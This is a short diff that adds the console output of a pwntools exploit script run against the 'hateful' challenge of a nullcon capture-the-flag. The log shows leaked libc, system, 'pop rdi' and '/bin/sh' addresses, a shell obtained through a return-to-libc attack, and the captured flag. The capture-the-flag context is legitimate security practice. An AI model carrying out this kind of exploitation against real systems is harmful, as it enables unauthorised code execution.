@@ -1,0 +1,12 @@
+/home/kali/CTF/nullcon/hateful/exp.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  binsh = next(libc.search('/bin/sh\x00'))
+[*] Libc address: 0x7fc86f76f000
+[*] System address: 0x7fc86f7bb490
+[*] POp rdi: 0x7fc86f7967e5
+[*] Binsh: 0x7fc86f905031
+0x7fc86f941a80
+[*] Switching to interactive mode
+
+Got it! we will send the message for him later!
+$ cat flag.txt
+ENO{W3_4R3_50RRY_TH4T_TH3_M3554G3_W45_N0T_53NT_T0_TH3_R1GHT_3M41L}$  
